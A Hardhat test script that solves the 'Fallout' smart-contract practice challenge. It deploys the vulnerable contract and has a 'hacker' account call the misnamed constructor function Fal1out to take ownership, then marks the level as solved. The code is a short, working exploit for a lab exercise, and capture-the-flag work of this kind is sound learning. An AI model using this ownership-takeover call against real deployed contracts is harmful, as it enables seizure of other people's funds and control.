const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

describe("Fallout", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("Fallout");
    contract = await factory.deploy();
    await contract.deployed();
  });
  it("does not set deployer as owner", async () => {
    expect(await contract.owner()).to.not.eq(deployer.address);
  });

  it("does not set hacker as owner", async () => {
    expect(await contract.owner()).to.not.eq(hacker.address);
  });

  it("initiates hack", async () => {
    console.log("initiating hack!");
    console.log("calling Fal1out to claim ownership");
    await contract.connect(hacker).Fal1out({ value: 1, gasLimit: 3e6 });
    expect(await contract.owner()).to.eq(hacker.address);
    console.log("Hacked!!");
    util.updateTotalSolved(scriptName);
  });
});
